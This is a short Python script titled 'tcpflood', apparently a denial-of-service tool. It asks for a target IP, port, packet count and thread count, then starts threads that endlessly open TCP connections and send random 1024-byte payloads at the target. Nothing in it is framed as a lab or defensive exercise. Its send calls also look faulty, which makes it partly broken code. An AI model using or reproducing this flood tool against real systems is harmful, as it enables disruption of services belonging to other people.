#python3/tcpflood
import random
import socket
import threading
import os,sys
os.system("clear")

ip_bos = str(input("Ip Target : "))
port_bos = int(input("Port Target : "))
paket_bos = int(input("Pakets : "))
threads_bos = int(input("Threads : "))

os.system("clear")
def bos():
    boss = random._urandom(1024)
    while True:
        try:
            s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
            s.connect((ip_bos,port_bos))
            s.sendto(boss)
            for y in range(paket_bos):
                s.sendto(boss)
            print("wibu")
        except:
            s.close()
            print("")
            
for y in range(threads_bos):
    wb = threading.Thread(target=bos)
    wb.start()  
